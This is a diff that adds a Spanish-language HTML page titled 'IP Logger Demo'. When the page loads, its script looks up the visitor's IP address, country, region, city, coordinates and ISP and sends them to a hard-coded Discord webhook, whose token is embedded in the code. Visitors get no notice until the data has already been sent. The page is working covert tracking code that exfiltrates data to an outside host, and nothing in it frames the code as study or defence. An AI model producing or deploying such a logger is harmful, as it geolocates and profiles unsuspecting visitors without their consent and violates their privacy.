@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Logger Demo</title>
+</head>
+<body>
+  <h1>Obteniendo IP...</h1>
+
+  <script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1356010314117943427/1EFY6VFfLFjllgQ-mNPO8LfBnNz13cYjveGH4Tku7yHF49nfmS3m6vjGXWWvSYWmoOOe';
+
+    async function logVisitorInfo() {
+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+
+        const payload = {
+          username: "IP Logger (HTML)",
+          embeds: [{
+            title: "🔍 Nueva visita (HTML)",
+            color: 16753920,
+            fields: [
+              { name: "🔗 IP", value: ipData.ip || "No disponible", inline: false },
+              { name: "🌎 País", value: ipData.country_name || "No disponible", inline: true },
+              { name: "🗺️ Región", value: ipData.region || "No disponible", inline: true },
+              { name: "🌆 Ciudad", value: ipData.city || "No disponible", inline: true },
+              { name: "📍 Coordenadas", value: `${ipData.latitude}, ${ipData.longitude}` || "No disponible", inline: true },
+              { name: "🧭 ISP", value: ipData.org || "No disponible", inline: false }
+            ],
+            footer: { text: `Fecha: ${new Date().toLocaleString()}` }
+          }]
+        };
+
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        document.body.innerHTML = "<h2>¡Información enviada al webhook!</h2>";
+
+      } catch (error) {
+        console.error("Error:", error);
+        document.body.innerHTML = "<h2>Error al obtener o enviar información.</h2>";
+      }
+    }
+
+    logVisitorInfo();
+  </script>
+</body>
+</html>
